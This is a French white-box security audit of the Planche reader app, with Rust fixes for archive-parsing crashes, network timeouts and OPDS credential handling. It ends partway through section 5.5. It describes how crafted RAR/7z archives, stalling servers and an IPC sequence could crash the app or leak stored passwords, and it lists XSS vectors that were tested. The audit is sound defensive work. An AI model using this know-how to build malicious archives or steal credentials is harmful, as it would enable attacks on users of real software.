# Planche — audit de sécurité en boîte blanche (08/11/2026, deuxième passe)

État audité : branche `fix/revue-securite-2026-11` (PR #22), HEAD `5468d19`, c'est-à-dire le code **après** les corrections des deux revues précédentes ([REVUE_SECURITE_2026-11-08.md](REVUE_SECURITE_2026-11-08.md), [AUDIT_OPEN_SOURCE_2026-11-08.md](AUDIT_OPEN_SOURCE_2026-11-08.md)). Ce document ne répète pas les constats déjà corrigés ; il signale ceux dont le correctif est incomplet.

## 0. Périmètre, méthode, correspondance de pile

**Méthode.** Orchestration de 171 agents : 8 chercheurs indépendants (SQLite ; parsing XML/JSON/fichiers ; réseau ; chemins et archives ; Tauri/IPC ; React ; Android et CI ; dépendances et code natif), chacun lisant le code et les sources des bibliothèques tierces (registre Cargo local, `node_modules`) ; puis, pour **chaque** constat, 3 vérificateurs adverses à lentilles distinctes (exactitude du code à HEAD, exploitabilité et sévérité, qualité du correctif) ; un constat n'est retenu que confirmé à la majorité ; enfin un critique de complétude a comparé la couverture à la liste du demandeur et relu les fichiers que personne n'avait cités. Résultat : 54 constats remontés, **53 confirmés**, 1 rejeté (§7). La sévérité retenue est la médiane des trois vérificateurs. Revue statique, aucun exploit construit, aucune exécution de fichier piégé.

**Correspondance de pile.** Le brief décrit « Kotlin (Ktor / Jackson / Kotlinx.Serialization) » et « SQLite via Room ou Exposed ». Planche n'utilise aucun de ces composants ; les équivalents audités sont :

| Brief | Réalité dans Planche | Fichiers |
|---|---|---|
| SQLite via Room / Exposed | **rusqlite 0.41** (SQLite 3.54 embarqué), base **en mémoire**, instantané chiffré XChaCha20-Poly1305 sur disque | `db.rs`, `scan.rs`, `opds.rs`, `vault.rs`, `lib.rs` |
| Client réseau Ktor | **reqwest 0.13.5** (native-tls sur bureau, rustls + racines Mozilla sur Android) | `opds.rs` |
| Parseurs XML (Jackson XML, org.json) | **regex** côté Rust (ComicInfo, OPF) ; **`DOMParser`** du WebView côté page (OPDS 1, OpenSearch) ; **epub.js 0.3.93** (`DOMParser` natif, repli `@xmldom/xmldom` jamais atteint dans le navigateur) | `meta.rs`, `book.rs`, `src/opds.ts`, `node_modules/epubjs` |
| JSON | serde (Rust) ; `JSON.parse` (OPDS 2) | `opds.rs`, `src/opds.ts` |
| Kotlin | Uniquement le plugin de sélecteurs SAF et `MainActivity` | `plugins/planche-storage`, `gen/android` |
| Code natif non memory-safe | **UnRAR 7.1.0 C++ vendorisé** (via la crate `unrar` 0.5.8), SQLite C embarqué, ring (Android) | `vendor/unrar_sys` |

Résultats d'outils (à HEAD) : `npm audit` 0 vulnérabilité ; `cargo audit` 0 vulnérabilité (6 avis « non maintenu / unsound » Linux-GTK ignorés explicitement par `audit.yml`) ; CodeQL 0 alerte ; aucun secret dans l'arbre ni l'historique (§2 de l'audit précédent, refait par le critique : 0 correspondance).

## 1. Synthèse des risques

Échelle : Critique = exécution de code ou lecture/écriture de fichier arbitraire sans précondition ; Élevée = idem avec précondition réaliste, ou déni de service **persistant** par un seul fichier ; Moyenne = compromission préalable requise (injection que la CSP bloque aujourd'hui) ou DoS non persistant déclenchable à distance ; Faible = durcissement, robustesse ; Info = par conception.

| # | Sévérité | Constat | Localisation | Détail |
|---|---|---|---|---|
| H-1 | **Élevée** | Le marquage « en cours » du worker (correctif #1 de la PR #22) n'existe qu'en mémoire : l'instantané chiffré n'est écrit que toutes les 2 s. Tout décodeur qui tue le processus en moins de 2 s (M-2, M-3, M-4) est **repris à chaque démarrage** : la boucle de plantage que #1 devait supprimer subsiste. | `thumbs.rs:117-128`, `lib.rs` (fil de sauvegarde) | §5.1 |
| M-1 | Moyenne | Les couvertures OPDS partagent les 6 fils du protocole `planche://` avec les pages et vignettes ; un seul délai réseau de 30 min, pas de `read_timeout` : un catalogue lent ou hostile bloque l'affichage de toutes les pages jusqu'à 30 min, renouvelable. | `lib.rs` (handler), `opds.rs` `client()` | §5.2 |
| M-2 | Moyenne (→ Élevée avec H-1) | UnRAR vendorisé 7.1.0 (05/2024) : `RARReadHeaderEx` récursif (dll.cpp:218, 238), corrigé en amont dans 7.30 bêta (unrarsrc-7.3.2) ; une archive aux en-têtes « split before » consécutifs épuise la pile du worker en mode liste → arrêt du processus, hors de portée de `catch`/`panic`. Aucune crate publiée n'embarque le correctif (`unrar` 0.5.8 et `unrar-ng` 0.7.7 récursent encore). | `vendor/unrar_sys/vendor/unrar/dll.cpp`, `thumbs.rs:29-35` | §5.3 |
| M-3 | Moyenne (→ Élevée avec H-1) | Dictionnaire RAR non borné : ≤ 4 Gio → `malloc` de la fenêtre entière ; > 4 Gio (RAR7, `-md8g`) → code `ERAR_LARGE_DICT` (25) inconnu de la crate → `Code::from(25).unwrap()` → **panique → abort**. | `book.rs:330-335`, `thumbs.rs:40-44`, `meta.rs:58-61`, crate `unrar` | §5.4 |
| M-4 | Moyenne (→ Élevée avec H-1) | Archives solides : entrées ignorées décodées sans borne (CPU) ; `ArchiveReader::read_file` charge **en mémoire** chaque entrée précédant la cible (allocation non bornée dans le worker) ; `.cb7` contenant un nom `..` inouvrable (la bibliothèque échoue en bloc). | `book.rs:350-375`, `thumbs.rs:52-62`, `meta.rs:71-78` | §5.5 |
| M-5 | Moyenne | `opds_save` permet de déplacer un catalogue vers une autre origine en **conservant** le mot de passe, que `opds_fetch` envoie alors à cette origine : exfiltration de tous les identifiants OPDS en deux appels IPC (après injection). | `lib.rs` `opds_save`, `opds.rs:144-155, 183-191` | §5.6 |
| F-1 | Faible | SQLite : `temp_store` par défaut → tris et tables éphémères peuvent déborder en clair dans le dossier temporaire. | `db.rs:14-16` | §5.7 |
| F-2 | Faible | `user:motdepasse@hôte` accepté dans l'adresse du catalogue : mot de passe en base (hors coffre) et renvoyé à la page ; un lien de flux peut imposer un `Authorization` choisi par le serveur. | `opds.rs:117-123, 135-150` | §5.7 |
| F-3 | Faible | Clé du coffre système prioritaire sur le fichier de clé : après une remise à zéro faite pendant une panne du coffre, la clé retrouvée ouvre une bibliothèque vide alors que le fichier de clé ouvrait la bonne. | `vault.rs:110-128` | §5.7 |
| F-4 | Faible | Échecs de sauvegarde et refus du dialogue de récupération toujours silencieux (pas de console en production, aucun événement vers la page). | `lib.rs` `persist`, `open_vault` | §5.7 |
| F-5 | Faible | Verrou de la base tenu pendant tout le scan et pendant chaque écriture du coffre ; 24 commandes synchrones s'exécutent sur le fil principal → gel de la fenêtre. | `lib.rs` `scan`, `persist` | §5.7 |
| F-6 | Faible | Verrou par livre (#16) contourné par le worker (CBT) ; `opening` ne se vide jamais (croissance par ids arbitraires). | `thumbs.rs:65`, `lib.rs` `opened` | §5.7 |
| F-7 | Faible | OPDS 2 : normalisation `str()` incomplète (titre du flux, `names()`, `href` de navigation) ; `decodeURI` sans garde (OPDS 1) ; DOCTYPE accepté par `DOMParser` ; nombre d'entrées rendues non borné. | `src/opds.ts` | §5.8 |
| F-8 | Faible | EPUB : boucle `<itemref>` non bornée (CPU, heures) ; EPUB texte confié entier à epub.js/JSZip sans borne ; NCX sans `src` → `href: null` → écran blanc sans `ErrorBoundary` autour du lecteur ; `dc:language` invalide → `RangeError` dans `Intl.Segmenter` (lecture à voix haute). | `book.rs:216-232`, `TextReader.tsx`, `tts.ts:40-46` | §5.8 |
| F-9 | Faible | Cadre EPUB : neutralisation des liens par regex contournable (espaces, tabulations, `//hôte`), `area` et `<a xlink:href>` SVG non couverts, `meta refresh` / `base` / `link preconnect` laissés ; retransmission clavier qui avale les touches tapées dans un formulaire du livre. | `TextReader.tsx:152-179` | §5.8 |
| F-10 | Faible | pdf.js : worker chargé par URL donc hors CSP (déjà documenté) — correctif simple par `blob:`. | `src/pdf.ts:4-8` | §5.8 |
| F-11 | Faible | Téléchargements : `.part` laissé sur disque à toute erreur ; nom final choisi avant le transfert, `rename` écrase un autre téléchargement du même titre. | `opds.rs` `download` | §5.9 |
| F-12 | Faible | Extraction : composants invalides sous Windows (espace final, `nul/`, `<>"\|?*`) font échouer tout le livre au lieu d'ignorer l'entrée. | `book.rs:268-279` | §5.9 |
| F-13 | Faible | `save_thumbnail` : tout UUID bien formé crée un fichier, même sans livre ; `export_annotations` n'impose pas l'extension du format ; `set_settings` sans borne ; `opds_save` avec id inconnu écrit un secret orphelin. | `lib.rs` | §5.9 |
| F-14 | Faible | Protocole `planche://` : origine « locale » pour l'ACL Tauri, aucune garde de navigation ni CSP sur ses réponses ; `image/svg+xml` passe le filtre des couvertures. `opener:allow-reveal-item-in-dir` sans portée (tout chemin existant). | `lib.rs` (handler), `capabilities/default.json` | §5.10 |
| F-15 | Faible | Android : curseur JNI non fermé si une exception est pendante ; exceptions non interceptées dans les `@ActivityCallback` Kotlin (plantage) et sélecteurs concurrents ; `allowBackup=false` ne couvre pas le transfert d'appareil à appareil ; droits SAF jamais libérés ; `FileProvider` exposant la racine du stockage et tout le cache ; `add_root` n'identifie pas un sous-dossier SAF ; déplacement de la clé de secours par `rename` entre volumes. | `storage.rs`, `StoragePlugin.kt`, `AndroidManifest.xml`, `file_paths.xml`, `lib.rs`, `vault.rs` | §5.11 |
| F-16 | Faible | CI : wrapper Gradle non validé dans le job qui détient la clé de signature ; `cargo install cargo-audit` sans version ; `npm ci` exécute les `postinstall` transitifs (`core-js`, `es5-ext`) sur les runners ; Dependabot ignore Gradle et n'a pas de délai de refroidissement. | `.github/workflows/*.yml`, `dependabot.yml` | §5.12 |
| F-17 | Faible | `book_file_arg(std::env::args())` panique (abort) sur un argument non Unicode ; dossiers `cache/` et `thumbnails/` créés en 0755 sous Linux (pages de BD lisibles par les autres comptes). | `lib.rs` | §5.12 |
| I-1 | Info | Secret Partner Center toujours sur la ligne de commande de `msstore` (le commentaire du correctif #10 est inexact) ; `.gitignore` sans `.env`, `*.p12`, `*.pfx`, `*.pem`, clé JSON de compte de service ; intents `VIEW`/`SEND` Android acceptés mais ignorés ; procédure de mise à jour du vendor UnRAR inapplicable ; binaires des Releases sans sommes ni attestation ; `rundll32.exe` résolu par `std` (sûr, mais chemin absolu plus simple à justifier). | divers | §5.13 |
| — | Donnée personnelle | L'adresse e-mail personnelle (S-16 de l'audit précédent) était reproduite **en clair** dans `docs/AUDIT_OPEN_SOURCE_2026-11-08.md` ; retirée dans ce commit. | docs | — |

## 2. SQLite (rusqlite) — injections, concurrence, protection au repos

**Injections : aucune.** Les 8 chercheurs/vérificateurs ont énuméré chaque `execute`, `query_row`, `prepare`, `execute_batch` : 100 % paramétrées. Les seuls `format!` / `.replace("{table}")` interpolent des constantes de compilation (`BOOK_COLS`, `STANDALONE_COLS`, `ALL_BOOKS`, noms de tables tirés de tableaux littéraux `["books", "standalone"]`, `["bookmarks", "annotations"]`) — `db.rs:142, 258, 271, 277, 285, 315, 344, 387`, `scan.rs:262-270`. Aucun `LIKE`/`GLOB`, aucun `ORDER BY` dynamique, `PRAGMA user_version` uniquement avec des littéraux. La page n'atteint que la clé `kv` « settings » (`get_settings`/`set_settings`) : les mots de passe OPDS Android (`opds-password:{id}`) sont inaccessibles ; sur bureau ils sont dans le coffre système et `Catalog.password` est `#[serde(skip)]`.

**Concurrence.** Un seul `Mutex<Connection>` ; base en mémoire ; pas de TOCTOU exploitable. Constats : F-5 (verrou tenu pendant le scan — listage récursif, lecture de 128 Kio par fichier, JNI sous Android — et pendant sérialisation + chiffrement + `fsync` toutes les 2 s, alors que 24 commandes synchrones tournent sur le **fil principal** : la fenêtre gèle) ; F-6 (le worker contourne le verrou par livre ; `opening` croît avec les ids demandés, y compris inexistants).

**Au repos.** Chiffrement sain (XChaCha20-Poly1305, nonce 192 bits aléatoire par écriture via `getrandom`, AAD versionnée, clé 256 bits ; `load_key` ne régénère jamais de clé quand un instantané existe ; écriture atomique + `.bak`). Constats : F-1 (`temp_store` : SQLite peut écrire des fichiers de tri en clair dans `%TEMP%` dès qu'un `ORDER BY` dépasse le cache), F-3 (ordre de préférence des clés), F-4 (échecs silencieux), H-1 (le marquage « en cours » n'est pas sur disque avant le décodage), et sous Android/Windows le fichier de clé de secours à côté du coffre a été traité par la PR #22 — reste le transfert d'appareil à appareil (F-15).

## 3. OPDS et parsing — XXE, SSRF, traversée et zip slip

**XXE / DOCTYPE / entités, parseur par parseur.**
- `meta.rs`, `book.rs` (Rust) : aucun parseur XML, extraction par regex linéaires (crate `regex`), `decode_entities` ne traite qu'un niveau d'entités nommées/numériques : **XXE et billion laughs impossibles**. Tailles bornées (1 Mio ComicInfo/OPF côté `meta.rs`, 4 Mio par document côté `book.rs`) — mais pas le **nombre** de documents du spine (F-8).
- `src/opds.ts` (`DOMParser`, `application/xml`) : le WebView (Blink/WebView2 sous Windows et Android, WebKitGTK sous Linux) ne charge jamais d'entité externe hors origine, mais **accepte un `<!DOCTYPE>` et expand les entités internes** ; `parsererror` est testé pour les flux, pas pour la description OpenSearch. Correctif F-7 : refuser tout DOCTYPE avant analyse (jamais légitime dans un flux Atom).
- epub.js : `core.js parse()` choisit le `DOMParser` natif quand il existe (`typeof DOMParser === "undefined" || forceXMLDom` → xmldom) : `@xmldom/xmldom` n'est **pas atteint** dans le navigateur ; l'override `^0.8.15` reste une précaution.
- pdf.js : son parseur XML interne (XMP/XFA) n'est jamais exécuté (`getMetadata` jamais appelé, `enableXfa` faux).

**SSRF.** `check_url` n'accepte que `http`/`https` (`file:`, `data:`, `javascript:` refusés). Ce que le moteur peut être amené à requêter : l'URL saisie par l'utilisateur, **les liens d'un flux** (choisis par le serveur) et, via `planche://…/opds-img/{catalogue}?u=…`, **toute URL http(s) fournie par la page**. Les identifiants ne partent que vers l'origine du catalogue (schéma + hôte + port) et reqwest les retire sur toute redirection changeant d'hôte, de port ou de schéma (vérifié dans `redirect.rs` 0.13.5). Les adresses locales/privées **ne sont pas bloquées**, par conception (Komga/Kavita en LAN) : acceptable pour un lecteur de bureau, documenté ; une garde optionnelle est donnée dans l'audit précédent (§4.7). Faille réelle dans ce chapitre : M-5 — l'origine « du catalogue » est elle-même modifiable par la page. Et F-2 : userinfo dans l'URL.

**Traversée / zip slip.** `safe_relative` (refus de `..`, absolus, lecteurs, flux `:`), écriture par notre code uniquement d'images sous `cache/<uuid>`, tailles bornées : **aucune évasion trouvée** dans aucun des quatre formats ; le ZIP est lu en place sans écriture ; TAR ignore liens/devices ; RAR : les liens deviennent des fichiers plats ; 7z : la bibliothèque n'écrit rien (`create_dir_all(dest)` seulement). Téléchargements : dossier fixé par le moteur, noms assainis, extension en liste blanche — aucune évasion. Constats résiduels : M-4 (coût CPU/mémoire des archives solides, `.cb7` inouvrable), F-12 (noms invalides sous Windows → livre inouvrable), F-11 (`.part`, écrasement).

## 4. Tauri et React — IPC, CSP, XSS

**Capacités et scopes.** `default.json` : `core:default`, `opener:allow-reveal-item-in-dir`, `core:window:allow-set-fullscreen`, `core:window:allow-is-fullscreen` ; `mobile.json` : `core:app:allow-exit`. **Aucun** plugin `fs`, `http`, `shell`, `dialog` n'est accordé à la page : les scopes `fs`/`http` du brief n'existent pas (toutes les E/S et le réseau passent par les 33 commandes applicatives, dont les arguments sont validés : ids UUID, chemins uniquement via la liste blanche `take_allowed`, URLs via `check_url`). `withGlobalTauri` absent, `pattern` brownfield par défaut, `assetProtocol` désactivé. Reste : F-14 (`reveal_item_in_dir` sans portée ; origine `planche://` considérée « locale » par l'ACL Tauri alors qu'elle sert des octets non fiables — sans chemin d'attaque aujourd'hui), F-13 (commandes sans borne), M-5.

**CSP** (`tauri.conf.json`) : `script-src 'self'` sans `unsafe-inline`/`unsafe-eval`, `object-src 'none'`, `form-action 'none'`, `base-uri 'self'`, `connect-src` limité à l'IPC et au protocole `planche` ; `'unsafe-inline'` uniquement sur `style-src` (nécessaire aux styles React et aux feuilles EPUB ; `dangerousDisableAssetCspModification: ["style-src"]` évite qu'un nonce Tauri n'annule cet `unsafe-inline`). Cadre EPUB : `srcdoc` sandboxé `allow-same-origin` sans `allow-scripts` ni `allow-popups` ni `allow-top-navigation`, héritant de la CSP.

**XSS.** Un seul `dangerouslySetInnerHTML` (`Panels.tsx:304`), alimenté par un texte entièrement échappé (`markExcerpt`) ; aucun `innerHTML`, `eval`, `new Function`, `window.open`, `href` dynamique, `postMessage` écouté ; `t()` ne produit pas de balisage ; couvertures OPDS uniquement via le proxy `opds-img` ; résumés OPDS `type="html"` rendus en **texte** (`textContent`) ; `sanitizeBookHtml` (impression) sans contournement trouvé (`<svg><script>`, `<math>`, `<base>`, `srcset`, `formaction`, `xlink:href`, RCDATA testés). **Aucune XSS** : le pont Tauri n'est pas atteignable par les métadonnées OPDS ou de livre. Les constats React sont des dénis de service d'affichage (objets rendus comme enfants React, `URIError`, `TypeError` sur `href: null`) : F-7, F-8, F-9.

## 5. Détail des vulnérabilités et correctifs

### 5.1 H-1 — Marquage « en cours » non persisté avant décodage (Élevée)
- **Localisation** : `planche/src-tauri/src/thumbs.rs:117-128` (`set_thumb(IN_PROGRESS)` / `set_meta_state(IN_PROGRESS)`), `lib.rs` fil de sauvegarde (`persist()` toutes les 2 s si `total_changes` a bougé), `db.rs` `reset_interrupted`.
- **Vecteur** : la marque 3 est écrite dans la base **en mémoire** ; l'instantané chiffré n'est réécrit que par le fil de sauvegarde (2 s) ou à la sortie. Un décodeur qui termine le processus en quelques millisecondes (épuisement de pile M-2, `unwrap` M-3, OOM M-4) le fait avant toute écriture ; au démarrage suivant la ligne est toujours à `thumb = 0`, `reset_interrupted` ne trouve rien, le worker (réveillé inconditionnellement au `setup`) reprend le même fichier : **Planche meurt à chaque lancement** tant que le fichier est dans un dossier scanné (il suffit que la ligne du livre ait été persistée ≥ 2 s avant son traitement, cas ordinaire d'un dossier de plusieurs BD).
- **Correctif** (fichier témoin, sans réécrire l'instantané à chaque livre) — `thumbs.rs` :
```rust
pub fn run(app: AppHandle, state: Arc<AppState>, wake: Receiver<()>) {
    // The IN_PROGRESS row lives in memory and the snapshot is written every 2 s:
    // a decoder that kills the process at once would be retried at every start.
    // The id being decoded is therefore also kept in a marker file.
    let marker = state.thumb_dir.join(".in_progress");
    {
        let conn = state.db.lock().unwrap();
        if let Ok(id) = std::fs::read_to_string(&marker) {
            db::mark_interrupted(&conn, id.trim());
            let _ = std::fs::remove_file(&marker);
        }
        db::reset_interrupted(&conn);
    }
    while wake.recv().is_ok() {
        …
            // juste après le bloc set_thumb / set_meta_state(IN_PROGRESS) :
            let _ = std::fs::write(&marker, &id);
            let thumb = …;      // décodage
            let metadata = …;
            let _ = std::fs::remove_file(&marker);
```
`db.rs` :
```rust
/// Book named by the worker's marker file when the process died while decoding
/// it: recorded as failed / without metadata, like `reset_interrupted`.
pub fn mark_interrupted(conn: &Connection, id: &str) {
    let _ = conn.execute("UPDATE books SET thumb = 2 WHERE id = ?1 AND thumb != 1", [id]);
    let _ = conn.execute("UPDATE books SET meta = 1 WHERE id = ?1 AND meta != 1", [id]);
}
```
Effet de bord à traiter en même temps : `reset_interrupted` passe aussi en « échec » un livre que le worker traitait lors d'une **fermeture normale** (l'`Exit` persiste sans attendre le worker) ; remettre `thumb = 0` dans ce cas (drapeau posé à `Exit`) ou attendre la fin du livre en cours avant de persister.

### 5.2 M-1 — Couvertures OPDS et pages sur les mêmes fils, délai réseau unique de 30 min
- **Localisation** : `lib.rs` `PROTOCOL_THREADS = 6`, handler `register_asynchronous_uri_scheme_protocol` (`gate.enter()` pris **avant** le `match` opds-img / serve) ; `opds.rs` `client()` (`connect_timeout(15 s)`, `timeout(30 min)`, pas de `read_timeout`) ; `opds_image` → `block_on(opds::image)`.
- **Vecteur** : un catalogue (ajouté par l'utilisateur, usage prévu) dont le serveur accepte la connexion puis n'envoie rien, ou au compte-gouttes, tient un fil 30 min **par couverture** ; `Catalogs.tsx` charge une `<img>` par entrée dès l'ouverture du flux → les 6 jetons sont pris ; toute requête `page/`, `thumb/`, `raw/` attend sur le `Condvar` sans limite ; fermer le catalogue ne libère rien (aucune annulation côté Rust). Non persistant (redémarrage).
- **Correctif** — `opds.rs` :
```rust
/// Feeds and covers are shown while the user waits: a stalled server must not
/// hold a request (nor a protocol slot) for long. Downloads may take long but
/// must keep making progress (READ_TIMEOUT resets after every received frame).
const FEED_TIMEOUT: Duration = Duration::from_secs(120);
const IMAGE_TIMEOUT: Duration = Duration::from_secs(60);
const DOWNLOAD_TIMEOUT: Duration = Duration::from_secs(60 * 30);
const READ_TIMEOUT: Duration = Duration::from_secs(30);

fn client() -> Result<reqwest::Client> {
    let builder = reqwest::Client::builder()
        .user_agent(concat!("Planche/", env!("CARGO_PKG_VERSION")))
        .connect_timeout(Duration::from_secs(15))
        .read_timeout(READ_TIMEOUT);
    // (bloc Android inchangé)
    Ok(builder.build()?)
}

async fn request(catalog: &Catalog, raw_url: &str, accept: &str, timeout: Duration) -> Result<reqwest::Response> {
    let url = check_url(raw_url)?;
    let base = check_url(&catalog.url)?;
    // Per-request total timeout (RequestBuilder::timeout replaces the client's).
    let mut req = client()?.get(url.clone()).timeout(timeout).header(reqwest::header::ACCEPT, accept);
    …
}
// appels : fetch → FEED_TIMEOUT, image → IMAGE_TIMEOUT, download → DOWNLOAD_TIMEOUT
```
`lib.rs` : deux sémaphores, le jeton gardé jusqu'après `responder.respond` :
```rust
/// Threads answering page and thumbnail requests at once.
const PROTOCOL_THREADS: usize = 6;
/// Cover downloads in flight at once: they wait on remote servers and must never take the page slots.
const COVER_THREADS: usize = 4;
// AppState : gate: Gate, cover_gate: Gate (construits dans setup)
            std::thread::spawn(move || {
                let state = app.state::<Arc<AppState>>();
                let (_slot, result) = match path.strip_prefix("/opds-img/") {
                    Some(catalog_id) => (state.cover_gate.enter(), opds_image(&state, catalog_id, &query)),
                    None => (state.gate.enter(), serve(&state, &path)),
                };
```
Avec le `read_timeout`, les erreurs de téléchargement deviennent plus fréquentes : appliquer F-11 (suppression du `.part` sur toute erreur) en même temps. Test conseillé : serveur local qui accepte puis ne répond jamais, flux de 8 couvertures, ouverture d'une BD → pages affichées immédiatement.

### 5.3 M-2 — UnRAR 7.1.0 obsolète : récursion de `RARReadHeaderEx`
- **Localisation** : `vendor/unrar_sys/vendor/unrar/version.hpp` (7.1.0, 12/05/2024) ; `dll.cpp:218` et `:238` (`return RARReadHeaderEx(hArcData,D);`) ; appelants `thumbs.rs:29-35` (`open_for_listing()` = `RAR_OM_LIST`, seul mode où la branche 234-238 existe), `book.rs:320-348`, `meta.rs:51-69` (`RAR_OM_EXTRACT`, variante multi-volumes seulement).
- **Vecteur** : une archive dont les en-têtes de fichier consécutifs portent le drapeau « split before » (lu tel quel, jamais confronté à `Arc.Volume`) fait récurser `RARReadHeaderEx` une fois par en-tête lors du listage par le worker : quelques dizaines de milliers d'en-têtes (< 1 Mio) épuisent la pile de 2 Mio du fil → fin du processus, hors de portée des `catch` de dll.cpp et de `panic = "abort"`. RARLAB : WinRAR 7.30 bêta 1 §15 a « fixed a crash in unrar.dll library caused by excessive function recursion » ; dans unrarsrc-7.3.2 la récursion devient une boucle bornée (`RepeatCount > 0x10000` → `ERAR_BAD_ARCHIVE`). Les autres avis récents (CVE-2025-6218, CVE-2025-8088 — traversées à l'extraction ; CVE-2026-14191 — volumes de récupération) **ne sont pas atteints** : Planche n'extrait jamais par UnRAR (`RAR_TEST`, `FileCreateMode = !TestMode`), et `recvol*.cpp` n'est pas compilé. Vérifié par nous : `unrar-ng-sys` 0.7.7 (UnRAR 7.21, 03/2026) récurse encore (`dll.cpp:235, 255`) ; changer de crate ne suffit pas.
- **Correctif immédiat, indépendant d'UnRAR** — `thumbs.rs:28-36`, ne plus lister en `RAR_OM_LIST` :
```rust
            // Listed in extract mode on purpose: in list mode (RAR_OM_LIST),
            // UnRAR's RARReadHeaderEx recurses once per "split before" header
            // and a crafted archive exhausts the stack (fixed upstream in 7.3.x).
            let mut listing = unrar::Archive::new(path).open_for_processing().map_err(|e| anyhow!("rar: {e}"))?;
            let mut names = Vec::new();
            while let Some(header) = listing.read_header().map_err(|e| anyhow!("rar: {e}"))? {
                if names.len() >= book::MAX_ENTRIES {
                    bail!("too many entries");
                }
                if header.entry().is_file() {
                    names.push(header.entry().filename.to_string_lossy().into_owned());
                }
                listing = header.skip().map_err(|e| anyhow!("rar: {e}"))?;
            }
            let names = sorted(names);
```
(`MAX_ENTRIES` en `pub` dans `book.rs`.)
- **Correctif de fond** — passer l'arbre vendorisé à **unrarsrc-7.3.2** (rarlab.com/rar_add.htm ; Debian sid `unrar-nonfree 1:7.3.2-1`), procédure vérifiée :
  1. `cd planche/src-tauri/vendor/unrar_sys/vendor && curl -fsSLO https://www.rarlab.com/rar/unrarsrc-7.3.2.tar.gz` ; recouper la somme SHA-256 avec le `.orig.tar.gz` Debian ; `git rm -rq unrar && tar xzf unrarsrc-7.3.2.tar.gz` ; écrire `7.3.2` dans un nouveau fichier `UNRAR_VERSION` (numéro du **tarball**, distinct de `version.hpp`).
  2. Patches de `patches.txt` (commits de muja/unrar.rs, absents de ce dépôt — `upgrade.sh` ne peut pas marcher ici) : `5accdb7` (dll.cpp, handle « damaged ») à refaire à la main (`delete Data; return nullptr;` → `return (HANDLE) Data;`) ; `f2adc58` (isnt.cpp) **obsolète** (7.3.2 met le bloc WMI sous `#if 0`) ; `c3b414e` (rijndael.cpp, system.cpp : `__builtin_cpu_supports` gardé par `__GLIBC__ && !_APPLE`) à rejouer, nécessaire pour Android x86 et macOS ; `7db15f7` : vérifier `grep -nP '[^\x00-\x7F]' cmddata.cpp`.
  3. `build.rs` : ajouter `"largepage"` partout (stubs hors Windows/RARDLL) et `"motw"` **sous Windows seulement** (`PROPAGATE_MOTW` n'existe que sous `_WIN_ALL` ; sans lui, LNK2019 sous MSVC) ; garder `-std=c++14`.
  4. FFI : `RAROpenArchiveDataEx` remplace `Reserved[25]` par `MarkOfTheWeb`, `MaxDiskWrite`, `MaxAllocate`, `MaxRuntime`, `Reserved[20]` ; la crate zéro-remplit → pointeur nul, limites 0 = « sans limite » dans 7.3.2 ; `RAR_DLL_VERSION` 9 → 11 (test `unrar_sys/src/lib.rs` à mettre à jour) ; nouveau code `ERAR_USER_LIMIT 26` (cf. M-3 : mapper les codes inconnus).
  5. Vérifier qu'il ne reste aucun `return RARReadHeaderEx(` dans dll.cpp ; compiler Windows MSVC, Linux, Android 4 ABI ; ouvrir un CBR, un CBR multi-volume, un CBR chiffré ; mettre à jour `vendor/README.md` et `docs/SECURITE.md`.
  Alternative minimale sans changement FFI : rétro-porter sur 7.1.0 les seules modifications de dll.cpp (boucle `RepeatCount ≤ 0x10000`, `ServiceCount ≤ 1024`, `catch (std::length_error&)`).

### 5.4 M-3 — Dictionnaire RAR non borné ; code `ERAR_LARGE_DICT` inconnu → panique
- **Localisation** : `book.rs:330-335`, `thumbs.rs:40-44`, `meta.rs:58-61` (seule `unpacked_size` est bornée) ; UnRAR `options.cpp:12-13` (`WinSizeLimit = 4 Gio`), `extract.cpp` `CheckWinLimit`, `unpack.cpp:128` `malloc((size_t)WinSize)` ; crate `unrar` 0.5.8 `open_archive.rs` (`Code::from(…).unwrap()` ×3), `error.rs` (codes ≤ 24), `unrar_sys/src/lib.rs` (pas d'`ERAR_LARGE_DICT`, pas d'`UCM_LARGEDICT`).
- **Vecteur** : (a) en-tête RAR5/RAR7 déclarant un dictionnaire ≤ 4 Gio : UnRAR alloue toute la fenêtre avant de décompresser (mémoire virtuelle ; rendue résidente par un flux solide) — kill mémoire sur Android ; (b) dictionnaire > 4 Gio (RAR7 `-md8g`, légitime pour WinRAR 7) : `uiDictLimit` → callback de la crate (`_ => 0`) → `DllError = ERAR_LARGE_DICT` (25) → `Code::from(25)` = `None` → **`unwrap()` → panique → abort**. Déclenché par le worker dès le scan (`header.read()`), par `meta.rs`, et à chaque ouverture ; aussi via `header.skip()` sur archive solide.
- **Correctif** — crate `unrar` vendorisée (`[patch.crates-io] unrar = { path = "vendor/unrar" }`, copie de 0.5.8) :
```rust
// vendor/unrar_sys/src/lib.rs
pub const ERAR_LARGE_DICT: c_int = 25;   // après ERAR_BAD_PASSWORD
pub const UCM_LARGEDICT: c_uint = 5;     // après UCM_NEEDPASSWORDW
// vendor/unrar/src/error.rs — enum Code
    LargeDict = native::ERAR_LARGE_DICT,
// Code::from : native::ERAR_LARGE_DICT => Some(LargeDict),
// Display : (LargeDict, _) => write!(f, "Dictionary size exceeds the allowed limit"),
// vendor/unrar/src/open_archive.rs : les trois `Code::from(…).unwrap()` → `.unwrap_or(Code::Unknown)`
// (ne jamais répondre 1 à UCM_LARGEDICT : laisser `_ => 0`)
// struct FileHeader : pub dict_size_kib: u32,  et dans From<HeaderDataEx> : dict_size_kib: header.dict_size,
```
Planche — refuser avant **toute** opération (y compris `skip()`), `book.rs` à côté de `MAX_ENTRY_BYTES` :
```rust
/// RAR dictionaries above this size are refused: UnRAR allocates the whole
/// window before unpacking, and a window larger than the largest accepted
/// entry only serves solid streams.
pub const MAX_RAR_DICT_KIB: u32 = 256 * 1024;
```
`book.rs` (après `let entry = header.entry();`), et **en tête** des boucles `while let Some(header) = archive.read_header()…` de `thumbs.rs` et `meta.rs` :
```rust
        if header.entry().dict_size_kib > book::MAX_RAR_DICT_KIB {
            bail!("rar: dictionary too large");
        }
```

### 5.5 M-4 — Archives solides : décodage et mise en mémoire non bornés ; `.cb7` inouvrable
- **Localisation** : `book.rs:350-375` (`extract_7z` via `decompress_with_extract_fn` : la bibliothèque appelle `safe_join` et échoue en bloc sur `..`/racine ; les entrées refusées sont drainées par `io::copy` sans être comptées), `book.rs:331-345` (`extract_rar` : `header.skip()` sur archive solide décompresse en mode test, non compté), `thumbs.rs:52-62` et `meta.rs:71-78` (`ArchiveReader::read_file` : en bloc solide, **chaque entrée précédant la cible est lue entièrement en mémoire**, `reader.rs:1693-1716` de sevenz-rust2 0.24.1).
